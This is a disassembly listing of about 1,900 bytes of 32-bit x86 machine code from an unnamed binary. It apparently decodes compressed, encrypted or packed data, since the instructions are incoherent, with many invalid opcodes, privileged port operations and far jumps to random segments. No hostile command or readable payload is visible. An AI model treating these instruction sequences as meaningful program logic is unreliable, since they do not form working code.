  41e8d3:	cmp    eax,0xe9a25b4
  41e8d8:	(bad)  
  41e8db:	repz imul BYTE PTR [edx+0x12]
  41e8df:	enter  0xdb57,0x23
  41e8e3:	clc    
  41e8e4:	icebp  
  41e8e5:	sahf   
  41e8e6:	fwait
  41e8e7:	jno    0x41e8db
  41e8e9:	xor    dh,BYTE PTR [ecx-0x37]
  41e8ec:	mov    eax,DWORD PTR [ebx]
  41e8ee:	or     BYTE PTR [edx],ah
  41e8f0:	ret    0x38c4
  41e8f3:	inc    ebx
  41e8f4:	mov    eax,DWORD PTR [ebx+0x41]
  41e8f7:	fsubr  QWORD PTR [esi+0x66ee1863]
  41e8fd:	mov    ebp,0x7ea18ca3
  41e902:	jle    0x41e8ed
  41e904:	rcr    ah,cl
  41e906:	jns    0x41e93d
  41e908:	es xor eax,0x53084106
  41e90e:	das    
  41e90f:	js     0x41e946
  41e911:	lahf   
  41e912:	test   BYTE PTR [ecx+0x765cd68d],cl
  41e918:	mov    esi,gs
  41e91a:	sbb    eax,0x6c1c3574
  41e91f:	mov    al,0x2
  41e921:	aaa    
  41e922:	sbb    DWORD PTR [ebx-0xd],ebp
  41e925:	outs   dx,BYTE PTR ds:[esi]
  41e926:	clc    
  41e927:	inc    esp
  41e928:	fmul   QWORD PTR [ebp+0x42]
  41e92b:	dec    esi
  41e92c:	pop    es
  41e92d:	push   esp
  41e92e:	adc    bh,ch
  41e930:	mov    bh,0xce
  41e932:	and    DWORD PTR [esp+edi*2+0x2583f60b],0x6d2f11cf
  41e93d:	ja     0x41e907
  41e93f:	pop    ebx
  41e940:	jp     0x41e8de
  41e942:	sbb    eax,0xab799deb
  41e947:	je     0x41e952
  41e949:	jnp    0x41e947
  41e94b:	stos   DWORD PTR es:[edi],eax
  41e94c:	stc    
  41e94d:	lods   al,BYTE PTR ds:[esi]
  41e94e:	shl    DWORD PTR [esp+eax*1+0x3cafe248],cl
  41e955:	push   edx
  41e956:	ds xor eax,0xc9adbbab
  41e95c:	cmp    BYTE PTR [esi],ah
  41e95e:	js     0x41e914
  41e960:	mov    eax,DWORD PTR [edi+esi*4+0x3a368b70]
  41e967:	je     0x41e98f
  41e969:	neg    DWORD PTR [edx-0x164f63a4]
  41e96f:	scas   al,BYTE PTR es:[edi]
  41e970:	popa   
  41e971:	mov    ebp,eax
  41e973:	out    0xf7,eax
  41e975:	adc    DWORD PTR [eax+ebp*4+0x2e220dd7],eax
  41e97c:	inc    esi
  41e97d:	mov    ebx,0xe5645014
  41e982:	xchg   edx,eax
  41e983:	clc    
  41e984:	ins    DWORD PTR es:[edi],dx
  41e985:	xor    eax,0x8bef0215
  41e98a:	ret    0x9583
  41e98d:	pmaddwd mm1,QWORD PTR [ecx+0x10faeaf1]
  41e994:	mov    edx,0xa233c20d
  41e999:	leave  
  41e99a:	int    0x51
  41e99c:	cmp    eax,DWORD PTR [edx]
  41e99e:	sti    
  41e99f:	sbb    BYTE PTR [ebx],bl
  41e9a1:	and    eax,0x346647f
  41e9a6:	punpcklbw mm2,DWORD PTR [ebx+0x54]
  41e9aa:	test   eax,0x39f476bf
  41e9af:	xchg   ecx,eax
  41e9b0:	jnp    0x41e9c9
  41e9b2:	repz fimul WORD PTR [eax-0x14]
  41e9b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9b7:	cmp    dh,BYTE PTR [esp+eax*8]
  41e9ba:	pop    ss
  41e9bb:	mov    bh,0xc3
  41e9bd:	or     ah,BYTE PTR [edi]
  41e9bf:	push   esp
  41e9c0:	jmp    0x41ea0d
  41e9c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9c3:	jmp    0x285a:0x25c00b11
  41e9ca:	xor    DWORD PTR [ebp-0x42df621a],0xffffff9c
  41e9d1:	addr16 push esp
  41e9d3:	or     dl,BYTE PTR [ecx+ebp*8]
  41e9d6:	sub    DWORD PTR cs:[edi],esp
  41e9d9:	inc    esp
  41e9da:	pusha  
  41e9db:	xlat   BYTE PTR ds:[ebx]
  41e9dc:	mov    ebp,0x4c19e648
  41e9e1:	aas    
  41e9e2:	(bad)  
  41e9e3:	jecxz  0x41e9be
  41e9e5:	pop    es
  41e9e6:	adc    al,0x5
  41e9e8:	inc    ebp
  41e9e9:	jbe    0x41ea4b
  41e9eb:	pop    ecx
  41e9ec:	rcl    DWORD PTR [ebx+0x58670741],cl
  41e9f2:	sar    BYTE PTR [ebp+0x1e3c8533],cl
  41e9f8:	popf   
  41e9f9:	test   al,0x55
  41e9fb:	mov    bl,0x6
  41e9fd:	add    DWORD PTR [esi+0x3d5841fd],ebp
  41ea03:	or     esp,eax
  41ea05:	xchg   ebp,eax
  41ea06:	jbe    0x41e9a5
  41ea08:	unpcklps xmm3,xmm7
  41ea0b:	and    al,BYTE PTR [edi]
  41ea0d:	hlt    
  41ea0e:	and    bl,al
  41ea10:	js     0x41e9cb
  41ea12:	or     al,0xd3
  41ea14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea15:	fnstcw WORD PTR [ecx+0x59]
  41ea18:	scas   eax,DWORD PTR es:[edi]
  41ea19:	(bad)  
  41ea1a:	in     al,0x30
  41ea1c:	adc    eax,0x13541cf7
  41ea21:	or     BYTE PTR [edx+0x11],cl
  41ea24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea25:	(bad)  
  41ea26:	pop    ebx
  41ea27:	out    dx,eax
  41ea28:	push   0x6b
  41ea2a:	and    eax,0x67150545
  41ea2f:	mov    ah,0x86
  41ea31:	mov    ah,0x58
  41ea33:	call   0x3d51:0x5bac2b56
  41ea3a:	mov    ah,0x3c
  41ea3c:	or     ebp,0x4d7c1e0a
  41ea42:	cmc    
  41ea43:	clc    
  41ea44:	jmp    0x41ea6a
  41ea46:	cmp    esp,esi
  41ea48:	push   0x4fe0406b
  41ea4d:	jmp    0xe89:0x5fd3ba94
  41ea54:	rcl    BYTE PTR [eax],0xa1
  41ea57:	lock mov ds:0xcf8a4a90,eax
  41ea5d:	repz in al,dx
  41ea5f:	sbb    BYTE PTR ss:[ecx],dl
  41ea62:	aas    
  41ea63:	or     DWORD PTR [edx],eax
  41ea65:	and    DWORD PTR [edi],edi
  41ea67:	adc    DWORD PTR [edi-0x6fe16eed],edx
  41ea6d:	jle    0x41ea52
  41ea6f:	inc    esi
  41ea70:	stos   BYTE PTR es:[edi],al
  41ea71:	fisub  DWORD PTR [esi+eiz*4]
  41ea74:	cmp    bl,BYTE PTR [ebx]
  41ea76:	imul   ecx,DWORD PTR [ecx],0xffffffdf
  41ea79:	scas   eax,DWORD PTR es:[edi]
  41ea7a:	xor    eax,0xc6211edb
  41ea7f:	aaa    
  41ea80:	pop    ecx
  41ea81:	iret   
  41ea82:	mov    ebp,0x3f434493
  41ea87:	int3   
  41ea88:	pop    ds
  41ea89:	push   ecx
  41ea8a:	xchg   ecx,eax
  41ea8b:	ds (bad) 
  41ea8e:	mov    eax,ds:0xfb7c7af8
  41ea93:	and    eax,0x9a247f3c
  41ea98:	mov    edi,0x19d889fd
  41ea9d:	popa   
  41ea9e:	mov    ecx,0xba3ce451
  41eaa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  41eab0:	add    BYTE PTR [esi-0x3e],bh
  41eab3:	in     al,dx
  41eab4:	push   cs
  41eab5:	cld    
  41eab6:	cs (bad) 
  41eab8:	repnz lods eax,DWORD PTR ds:[esi]
  41eaba:	add    BYTE PTR [eax],bl
  41eabc:	xor    al,0xd
  41eabe:	rcr    ebx,cl
  41eac0:	int    0xc1
  41eac2:	add    DWORD PTR gs:[eax],eax
  41eac5:	stos   DWORD PTR es:[edi],eax
  41eac6:	add    eax,DWORD PTR [eax]
  41eac8:	add    bh,dh
  41eaca:	or     BYTE PTR [edx+0x13],cl
  41eacd:	jo     0x41ea9f
  41eacf:	inc    esi
  41ead0:	mov    fs,WORD PTR [edi-0x64]
  41ead3:	pop    edi
  41ead4:	lea    ecx,[esi]
  41ead6:	jg     0x41eaea
  41ead8:	dec    ebp
  41ead9:	sbb    BYTE PTR ds:0x23a2f54,0xc9
  41eae0:	xchg   ebx,eax
  41eae1:	jmp    0xcf6c:0x8cf2874b
  41eae8:	jg     0x41eb30
  41eaea:	xchg   ecx,eax
  41eaeb:	add    esp,ebp
  41eaed:	add    BYTE PTR [edx],dl
  41eaef:	stc    
  41eaf0:	stc    
  41eaf1:	cmp    DWORD PTR [esi+0x52abdd97],edx
  41eaf7:	out    0x8,eax
  41eaf9:	neg    BYTE PTR [edx]
  41eafb:	inc    ecx
  41eafc:	int    0x7e
  41eafe:	pop    es
  41eaff:	js     0x41eb1d
  41eb01:	pop    ebp
  41eb02:	xchg   ebx,eax
  41eb03:	fst    QWORD PTR [eax]
  41eb05:	call   0x192a:0x548ec043
  41eb0c:	dec    esi
  41eb0d:	xlat   BYTE PTR ds:[ebx]
  41eb0e:	and    DWORD PTR [esi+0x66667d12],esp
  41eb14:	call   0x1b5b:0xac7ef5f1
  41eb1b:	inc    ebp
  41eb1c:	leave  
  41eb1d:	xchg   edi,eax
  41eb1e:	xor    al,bl
  41eb20:	push   ebx
  41eb21:	fwait
  41eb22:	jo     0x41eb92
  41eb24:	mov    ds:0x63302bbb,al
  41eb29:	push   esp
  41eb2a:	adc    edx,ebx
  41eb2c:	jg     0x41eac9
  41eb2e:	push   ebx
  41eb2f:	les    ebx,FWORD PTR fs:[ecx-0x57c1a15e]
  41eb36:	lock in al,0x64
  41eb39:	aas    
  41eb3a:	push   0xffffffbb
  41eb3c:	sbb    eax,DWORD PTR [ecx+0x67533b11]
  41eb42:	dec    ebp
  41eb43:	(bad)  
  41eb45:	std    
  41eb46:	adc    esp,0x5f
  41eb49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb4a:	sub    DWORD PTR [eax+0x34],edx
  41eb4d:	adc    BYTE PTR [edi-0x21],dh
  41eb50:	mov    al,0x4b
  41eb52:	cmp    al,0xa0
  41eb54:	pop    ebp
  41eb55:	ds jp  0x41eb7c
  41eb58:	retf   
  41eb59:	xlat   BYTE PTR ds:[ebx]
  41eb5a:	shr    DWORD PTR [eax+0xebd559e],0x1
  41eb61:	int    0xeb
  41eb63:	xor    al,0xca
  41eb65:	push   0xfffffffd
  41eb67:	arpl   WORD PTR [eax+edi*1+0x21632048],bp
  41eb6e:	xor    bl,BYTE PTR [ecx]
  41eb70:	xchg   edi,eax
  41eb71:	sbb    BYTE PTR [ebx+eax*8],dh
  41eb74:	imul   ecx,DWORD PTR [edi+0x6e59ce08],0x9f3f6ee1
  41eb7e:	dec    ebx
  41eb7f:	loopne 0x41eb0d
  41eb81:	ret    
  41eb82:	es sub al,0xbf
  41eb85:	retf   
  41eb86:	inc    eax
  41eb87:	cmp    eax,0x770abf57
  41eb8c:	pop    edi
  41eb8d:	jns    0x41eb31
  41eb8f:	js     0x41eb51
  41eb91:	mov    ch,0x5b
  41eb93:	xchg   BYTE PTR [esi+eax*1+0x39],bh
  41eb97:	call   0xb870:0x91ca82ce
  41eb9e:	dec    edi
  41eb9f:	pop    edi
  41eba0:	mov    al,ds:0x3c1d2924
  41eba5:	fild   QWORD PTR [ebp-0x48]
  41eba8:	push   edi
  41eba9:	out    dx,al
  41ebaa:	ror    BYTE PTR [edi+0x1c],0x45
  41ebae:	retf   
  41ebaf:	jge    0x41eb85
  41ebb1:	loopne 0x41ec28
  41ebb3:	mov    eax,0x6831a24d
  41ebb8:	add    ch,bh
  41ebba:	rcl    BYTE PTR [eax],1
  41ebbc:	inc    ecx
  41ebbd:	add    BYTE PTR [ebp-0x16],0x9f
  41ebc1:	and    ebp,DWORD PTR [edi-0x6e668002]
  41ebc7:	inc    eax
  41ebc8:	cli    
  41ebc9:	sub    al,0xa3
  41ebcb:	inc    esi
  41ebcc:	mov    bh,0x91
  41ebce:	stos   BYTE PTR es:[edi],al
  41ebcf:	aam    0x2d
  41ebd1:	dec    ebx
  41ebd2:	jae    0x41ebd0
  41ebd4:	inc    esi
  41ebd5:	xchg   BYTE PTR [eax],bl
  41ebd7:	sar    BYTE PTR [esi-0x3a],cl
  41ebda:	pop    esp
  41ebdb:	ret    
  41ebdc:	mov    WORD PTR [edi+0x52118b7d],?
  41ebe2:	or     dh,BYTE PTR [esp+edi*4+0x40]
  41ebe6:	jge    0x41eb83
  41ebe8:	push   esi
  41ebe9:	mov    cl,0x44
  41ebeb:	les    ebx,FWORD PTR [ecx-0x59]
  41ebee:	idiv   BYTE PTR [ecx+edx*8+0x6c]
  41ebf2:	jle    0x41ebd0
  41ebf4:	mov    cl,0x5b
  41ebf6:	aad    0x9e
  41ebf8:	shl    ebp,1
  41ebfa:	(bad)  
  41ebfb:	(bad)  
  41ebfc:	test   eax,0xfe27194c
  41ec01:	sbb    eax,0x9d3e7dd9
  41ec06:	ss (bad) 
  41ec08:	cmp    al,0xb5
  41ec0a:	dec    ebx
  41ec0b:	ins    DWORD PTR es:[edi],dx
  41ec0c:	inc    esp
  41ec0d:	sub    al,0xa2
  41ec0f:	xchg   ebp,eax
  41ec10:	and    DWORD PTR [ebx+0x7f],0x44cc46d1
  41ec17:	jmp    0x41eba9
  41ec19:	pushf  
  41ec1a:	je     0x41ec59
  41ec1c:	stos   DWORD PTR es:[edi],eax
  41ec1d:	push   ebp
  41ec1e:	mov    WORD PTR [edx-0x4663bec6],fs
  41ec24:	retf   
  41ec25:	icebp  
  41ec26:	inc    edx
  41ec27:	ins    DWORD PTR es:[edi],dx
  41ec28:	xchg   ecx,eax
  41ec29:	jg     0x41ec12
  41ec2b:	je     0x41ecab
  41ec2d:	(bad)  
  41ec2e:	xor    esi,DWORD PTR [edi+0x6e06c5c8]
  41ec34:	cwde   
  41ec35:	int3   
  41ec36:	mov    al,0xde
  41ec38:	jp     0x41ecaf
  41ec3a:	ds mov ebp,0xa36ec162
  41ec40:	fwait
  41ec41:	ss jae 0x41ec46
  41ec44:	sbb    al,0xad
  41ec46:	mov    dl,0xb1
  41ec48:	mov    ds:0x6cfccb7b,eax
  41ec4d:	aam    0x9b
  41ec4f:	inc    edx
  41ec50:	mov    es,esi
  41ec52:	adc    ch,BYTE PTR [edx+0x4a]
  41ec55:	ins    DWORD PTR es:[edi],dx
  41ec56:	jo     0x41ecad
  41ec58:	aaa    
  41ec59:	cmp    eax,0xdce94603
  41ec5e:	mov    ecx,0xe15a21aa
  41ec63:	ss loop 0x41ec75
  41ec66:	mov    ebx,0x9c7a78c0
  41ec6b:	loopne 0x41ec99
  41ec6d:	stc    
  41ec6e:	sub    BYTE PTR [edi+eax*8+0x9af13d7],0xa7
  41ec76:	add    BYTE PTR [ebx+0x5171f105],0xd7
  41ec7d:	in     al,dx
  41ec7e:	mov    DWORD PTR [eax-0x59],edx
  41ec81:	and    dh,BYTE PTR [edi]
  41ec83:	or     al,0xd4
  41ec85:	adc    esi,DWORD PTR [edi+0xc]
  41ec88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec89:	mov    dh,0x3d
  41ec8b:	xlat   BYTE PTR ds:[ebx]
  41ec8c:	test   dl,ch
  41ec8e:	in     al,dx
  41ec8f:	repnz sub eax,0x4ed68fd3
  41ec95:	call   0x7db3ae57
  41ec9a:	inc    ecx
  41ec9b:	xor    ebx,ebp
  41ec9d:	jo     0x41ec26
  41ec9f:	ins    BYTE PTR es:[edi],dx
  41eca0:	sub    BYTE PTR [bx+si-0x55],ah
  41eca4:	sub    DWORD PTR [edx+0x47451f3a],edi
  41ecaa:	dec    eax
  41ecab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecac:	fwait
  41ecad:	aas    
  41ecae:	jno    0x41ecb3
  41ecb0:	int    0x51
  41ecb2:	mov    ds:0x5bdd701c,eax
  41ecb7:	mov    esp,0x93065626
  41ecbc:	cmp    dh,BYTE PTR [esi+edi*4-0x15]
  41ecc0:	mov    dl,BYTE PTR [edi]
  41ecc2:	nop
  41ecc3:	data16 outs dx,BYTE PTR ds:[esi]
  41ecc5:	mov    edi,0x675c23f8
  41ecca:	pop    esi
  41eccb:	cmp    eax,0x25a61490
  41ecd0:	ret    
  41ecd1:	xchg   ecx,eax
  41ecd2:	outs   dx,DWORD PTR ds:[esi]
  41ecd3:	sar    BYTE PTR [esi],1
  41ecd5:	mov    ds:0x5247d99f,al
  41ecda:	sbb    edi,0xffffff8d
  41ecdd:	or     DWORD PTR [ebp+0x15],edx
  41ece0:	inc    ebx
  41ece1:	adc    al,0x32
  41ece3:	ja     0x41ec85
  41ece5:	sub    DWORD PTR [ebx-0x1be08547],0x6864203
  41ecef:	push   ds
  41ecf0:	mov    DWORD PTR [ecx+0x31],ecx
  41ecf3:	jno    0x41ecd5
  41ecf5:	push   edi
  41ecf6:	mov    WORD PTR [eax+0x1a],cs
  41ecf9:	out    dx,al
  41ecfa:	jmp    0x4a479107
  41ecff:	jp     0x41ed09
  41ed01:	ja     0x41ed5e
  41ed03:	mov    ah,0xfe
  41ed05:	test   ebp,ebp
  41ed07:	and    al,0x87
  41ed09:	mov    gs,WORD PTR cs:[ebp+0x2027ec50]
  41ed10:	add    cl,dl
  41ed12:	push   cs
  41ed13:	mov    ds:0x828c8188,eax
  41ed18:	aad    0x6e
  41ed1a:	dec    ecx
  41ed1b:	sub    ecx,DWORD PTR [ebx]
  41ed1d:	pop    ebx
  41ed1e:	(bad)  [ebp+0x5a28f4c1]
  41ed24:	(bad)
  41ed28:	outs   dx,BYTE PTR ds:[esi]
  41ed29:	into   
  41ed2a:	aas    
  41ed2b:	or     DWORD PTR [eax-0x47e1fc8],ebp
  41ed31:	push   es
  41ed32:	inc    ebx
  41ed33:	push   ds
  41ed34:	xchg   DWORD PTR [edx+ebp*1-0x3b],ecx
  41ed38:	popw   es
  41ed3a:	dec    esp
  41ed3b:	mov    cl,0x49
  41ed3d:	and    eax,0x3eedc453
  41ed42:	add    al,0x24
  41ed44:	dec    edi
  41ed45:	repz shl BYTE PTR [edi],1
  41ed48:	cmp    BYTE PTR [ecx-0x28],bl
  41ed4b:	and    BYTE PTR [edi-0x5337798b],0x4e
  41ed52:	add    bh,BYTE PTR [edi]
  41ed54:	mov    cl,0x1e
  41ed56:	adc    DWORD PTR [ecx],0xffffffc4
  41ed59:	retf   
  41ed5a:	sbb    esi,DWORD PTR ds:0x539a44fc
  41ed60:	adc    BYTE PTR [ecx+0x4e7f088c],dh
  41ed66:	popa   
  41ed67:	mov    bh,0x51
  41ed69:	dec    esi
  41ed6a:	mov    ecx,0x2444ee5
  41ed6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed70:	or     al,BYTE PTR [ecx+ebp*8-0x7c]
  41ed74:	out    dx,al
  41ed75:	jl     0x41ed09
  41ed77:	lock dec edi
  41ed79:	imul   esp,DWORD PTR [edx+0x33ea8bbe],0x9f0cb96f
  41ed83:	aaa    
  41ed84:	daa    
  41ed85:	out    0xae,al
  41ed87:	ficomp DWORD PTR [esp+eax*8+0x2a]
  41ed8b:	dec    DWORD PTR [ecx]
  41ed8d:	test   eax,edx
  41ed8f:	int3   
  41ed90:	sub    ch,BYTE PTR [edi+ecx*8-0x5b]
  41ed94:	fmul   st,st(4)
  41ed96:	and    cl,BYTE PTR [eax-0x53]
  41ed99:	mov    BYTE PTR [ebx+0x68e055cd],dl
  41ed9f:	imul   esp,DWORD PTR [ecx+ecx*1-0x4],0x75d4a622
  41eda7:	add    DWORD PTR ds:0x42657310,esp
  41edad:	pushf  
  41edae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edaf:	sahf   
  41edb0:	call   0x427a:0x9e3f3363
  41edb7:	cmp    ecx,ebp
  41edb9:	ds jg  0x41ed66
  41edbc:	sub    al,cl
  41edbe:	icebp  
  41edbf:	imul   eax,DWORD PTR [esp+ecx*4+0x24a32075],0xa0d8a58c
  41edca:	fs gs cs ins BYTE PTR es:[edi],dx
  41edce:	int    0x6a
  41edd0:	imul   edi,DWORD PTR [edi-0x52],0xb22a189a
  41edd7:	dec    edx
  41edd8:	cmc    
  41edd9:	pushw  ds
  41eddb:	inc    ecx
  41eddc:	mov    edi,0x423359a
  41ede1:	fstp   DWORD PTR [ebp+0x6da804a1]
  41ede7:	push   ebp
  41ede8:	add    al,ch
  41edea:	mov    esp,DWORD PTR [esi+0x406e6df2]
  41edf0:	and    esp,0x7e6c279e
  41edf6:	shl    DWORD PTR [eax],1
  41edf8:	int    0xf9
  41edfa:	and    BYTE PTR [esi+0x20],bl
  41edfd:	aam    0x98
  41edff:	daa    
  41ee00:	out    0xd2,al
  41ee02:	in     al,dx
  41ee03:	retf   
  41ee04:	inc    edi
  41ee05:	or     al,0x21
  41ee07:	mov    al,0x6e
  41ee09:	lods   al,BYTE PTR ds:[esi]
  41ee0a:	and    bl,BYTE PTR ds:0x6e880dfe
  41ee10:	cmp    BYTE PTR [edx+0x69f85c66],bh
  41ee16:	std    
  41ee17:	jecxz  0x41ee6d
  41ee19:	adc    DWORD PTR [edx-0x4c8f039],eax
  41ee1f:	out    dx,al
  41ee20:	das    
  41ee21:	lds    ebp,FWORD PTR [ecx+eax*8+0x67]
  41ee25:	adc    eax,0x411c53d1
  41ee2a:	test   ah,al
  41ee2c:	jecxz  0x41edcb
  41ee2e:	push   eax
  41ee2f:	mov    ss,WORD PTR [ebx+0x7b]
  41ee32:	mov    ebx,0xe513cf59
  41ee37:	cmp    BYTE PTR [ecx-0x41],dh
  41ee3a:	inc    ebx
  41ee3b:	xor    ebp,eax
  41ee3d:	mov    dh,0x19
  41ee3f:	and    DWORD PTR [eax-0x3b],esp
  41ee42:	sbb    eax,0xeef827cd
  41ee47:	mov    esp,0xf2312651
  41ee4c:	fistp  WORD PTR [ecx]
  41ee4e:	addr16 mov ch,0x3a
  41ee51:	loopne 0x41ee93
  41ee53:	aas    
  41ee54:	jmp    0x84150d8b
  41ee59:	xor    al,0x48
  41ee5b:	ins    BYTE PTR es:[edi],dx
  41ee5c:	pop    ebx
  41ee5d:	xchg   esi,eax
  41ee5e:	mov    dh,0x29
  41ee60:	out    0x59,al
  41ee62:	ins    DWORD PTR es:[edi],dx
  41ee63:	mov    dh,0x2f
  41ee65:	nop
  41ee66:	add    BYTE PTR [edx-0x2bdb6edd],bh
  41ee6c:	iret   
  41ee6d:	cmp    bl,BYTE PTR [ebx+edx*8]
  41ee70:	jnp    0x41ee84
  41ee72:	pop    esi
  41ee73:	pop    esp
	...
  41ee80:	add    BYTE PTR [esi-0x37],cl
  41ee83:	(bad)  [edi+ebx*8+0x5c]
  41ee87:	(bad)  
  41ee89:	mov    al,ds:0xdc2f76e4
  41ee8e:	ret    
  41ee8f:	push   ebx
  41ee90:	sbb    DWORD PTR [ecx+ebp*2+0x1],ebp
  41ee94:	add    BYTE PTR [ebx+0x36000003],ch
  41ee9a:	add    al,0xa4
  41ee9c:	imul   esp,ebp,0xd
  41ee9f:	or     eax,0x2b13abe8
  41eea4:	mov    eax,ds:0x4aef08db
  41eea9:	out    0xcc,eax
  41eeab:	in     al,0x47
  41eead:	adc    bl,BYTE PTR [ebx+0x21]
  41eeb0:	pop    esi
  41eeb1:	jne    0x41eec9
  41eeb3:	ds adc eax,0xcfe5146f
  41eeb9:	cld    
  41eeba:	sar    BYTE PTR [bx+di+0x14],1
  41eebe:	outs   dx,DWORD PTR ds:[esi]
  41eebf:	arpl   ax,bp
  41eec1:	test   BYTE PTR [edx-0x6],cl
  41eec4:	pop    es
  41eec5:	fisub  WORD PTR [ebx+0xb]
  41eec8:	outs   dx,DWORD PTR ds:[esi]
  41eec9:	shl    DWORD PTR [edx],cl
  41eecb:	jle    0x41eec8
  41eecd:	mov    ebx,0xa6622fc9
  41eed2:	lea    eax,[esi+0x2edc0b6c]
  41eed8:	mov    edi,DWORD PTR [esi+ebx*8+0x769b4c4c]
  41eedf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eee0:	sub    eax,0x9fc09845
  41eee5:	inc    ebp
  41eee6:	pop    es
  41eee7:	push   ebp
  41eee8:	and    BYTE PTR [ebx],bl
  41eeea:	cmp    BYTE PTR [esi+0x0],ch
  41eeed:	ins    DWORD PTR es:[edi],dx
  41eeee:	xor    DWORD PTR [edi+eiz*4+0x18],ebx
  41eef2:	push   ecx
  41eef3:	js     0x41eee6
  41eef5:	test   DWORD PTR [edx+0x51c3ddbc],edi
  41eefb:	retf   0x8ff0
  41eefe:	stc    
  41eeff:	je     0x41ef54
  41ef01:	mov    esp,DWORD PTR [ebx+ecx*4]
  41ef04:	sbb    ebp,eax
  41ef06:	shl    esp,0x46
  41ef09:	out    dx,eax
  41ef0a:	jae    0x41ef77
  41ef0c:	push   esi
  41ef0d:	and    eax,0x9e6abae1
  41ef12:	mov    esi,0x2d8d2f82
  41ef17:	test   BYTE PTR [ecx+edx*2+0x3a],dl
  41ef1b:	mov    al,ds:0x49ba8b30
  41ef20:	sub    al,0x16
  41ef22:	shr    esp,cl
  41ef24:	add    esp,DWORD PTR [edx+0x43]
  41ef27:	sbb    DWORD PTR fs:[esi],ecx
  41ef2a:	dec    ebp
  41ef2b:	jne    0x41ef5a
  41ef2d:	lods   al,BYTE PTR ds:[esi]
  41ef2e:	adc    BYTE PTR [eax+0x7c],cl
  41ef31:	push   cs
  41ef32:	jl     0x41ef57
  41ef34:	loope  0x41eedc
  41ef36:	stc    
  41ef37:	sti    
  41ef38:	mov    bh,BYTE PTR [esi]
  41ef3a:	xchg   esp,eax
  41ef3b:	sbb    DWORD PTR [ecx+0x37],0x43d1edd8
  41ef42:	repz lock ror DWORD PTR [edx+edi*4],cl
  41ef47:	mov    esp,0x45b5dc37
  41ef4c:	pop    esi
  41ef4d:	jmp    0xca92:0x810dca85
  41ef54:	out    0xd5,al
  41ef56:	dec    ebp
  41ef57:	jecxz  0x41eeef
  41ef59:	nop
  41ef5a:	inc    BYTE PTR [ebx-0x2a]
  41ef5d:	retf   
  41ef5e:	addr16 mov ah,ah
  41ef61:	sub    BYTE PTR [ebp-0x1a],0xb8
  41ef65:	rcl    BYTE PTR [eax],cl
  41ef67:	or     DWORD PTR [edx],ebx
  41ef69:	xchg   DWORD PTR [ecx-0x44c53a3],edi
  41ef6f:	push   si
  41ef71:	in     al,0x56
  41ef73:	and    BYTE PTR [eax-0x1469ab71],cl
  41ef79:	sbb    BYTE PTR [eax],bh
  41ef7b:	sbb    eax,0x2303f77
  41ef80:	and    DWORD PTR [edi],ebx
  41ef82:	js     0x41ef1b
  41ef84:	pop    ebx
  41ef85:	jle    0x41ef62
  41ef87:	daa    
  41ef88:	pop    edx
  41ef89:	push   edi
  41ef8a:	popf   
  41ef8b:	fistp  DWORD PTR [ebp+0x3fb02a9d]
  41ef91:	ins    DWORD PTR es:[edi],dx
  41ef92:	add    BYTE PTR [esi-0x7e],bh
  41ef95:	loopne 0x41ef86
  41ef97:	xchg   esp,eax
  41ef98:	mov    ch,0xb5
  41ef9a:	jno    0x41ef78
  41ef9c:	sbb    al,0xfd
  41ef9e:	fdiv   st(7),st
  41efa0:	in     al,0xd
  41efa2:	shr    DWORD PTR [edx],cl
  41efa4:	xchg   ecx,eax
  41efa5:	jb     0x41ef4e
  41efa7:	(bad)
  41efab:	cmp    eax,0xecb8afb3
  41efb0:	inc    ecx
  41efb1:	jp     0x41ef61
  41efb3:	dec    eax
  41efb4:	pop    ebx
  41efb6:	(bad)  
  41efb7:	and    DWORD PTR [ecx],edx
  41efb9:	pop    eax
  41efba:	aaa    
  41efbb:	addr16 test al,0x23
  41efbe:	mov    ecx,0xf4c6f21d
  41efc3:	pop    ecx
  41efc4:	ret    
  41efc5:	mov    ebx,0xb129fd1b
  41efca:	loop   0x41efaf
  41efcc:	repnz push ds
  41efce:	xchg   ebp,eax
  41efcf:	pushf  
  41efd0:	add    edi,0x9f7ea1f4
  41efd6:	lods   al,BYTE PTR ds:[esi]
  41efd7:	or     BYTE PTR [edi],dl
  41efd9:	je     0x41f03e
  41efdb:	dec    edi
  41efdc:	int3   
  41efdd:	nop
  41efde:	mov    esi,0x70c9a2f6
  41efe3:	push   esp
  41efe4:	lock loopne 0x41f01c
  41efe7:	xchg   ebx,eax
  41efe8:	or     DWORD PTR [ebx],esp
  41efea:	xor    DWORD PTR [edx-0x41],esp
  41efed:	pop    esi
  41efee:	ins    DWORD PTR es:[edi],dx
  41efef:	jno    0x41efd7
  41eff1:	pop    DWORD PTR [ebx-0x31a523ac]
  41eff7:	loope  0x41ef90
  41eff9:	cmc    
  41effa:	and    DWORD PTR [esi+ebx*1],edx
  41effd:	add    eax,0xf6760aee
  41f002:	mov    cl,0xa3
  41f004:	push   0x82cd97b8
  41f009:	jecxz  0x41efee
  41f00b:	mov    eax,0x3ddfa24e
  41f010:	xchg   ebx,eax
  41f011:	or     al,0x73
  41f013:	xor    eax,0x92871c5b
  41f018:	mov    cs,ebp
  41f01a:	push   eax
  41f01b:	retf   
  41f01c:	int3   
  41f01d:	mov    eax,0x53fe0831
  41f022:	mov    bh,0x98
  41f024:	out    0x38,al
  41f026:	loop   0x41efbf
  41f028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f029:	dec    esp
  41f02a:	int    0x48
  41f02c:	jmp    0x83792e89
  41f031:	mov    dl,0x30
  41f033:	idiv   DWORD PTR [ebx-0x35b6c9f2]
  41f039:	(bad)  
  41f03a:	adc    al,0xd5
  41f03c:	les    eax,FWORD PTR [eax-0x80]
  41f03f:	mov    BYTE PTR [ebp+0x3a195565],dh
  41f045:	daa    
  41f046:	loop   0x41f08b
  41f048:	inc    ebx
  41f049:	cmp    edi,ebx
  41f04b:	jns    0x41f051
  41f04d:	push   edx
  41f04e:	sub    eax,0x959c7973
  41f053:	nop
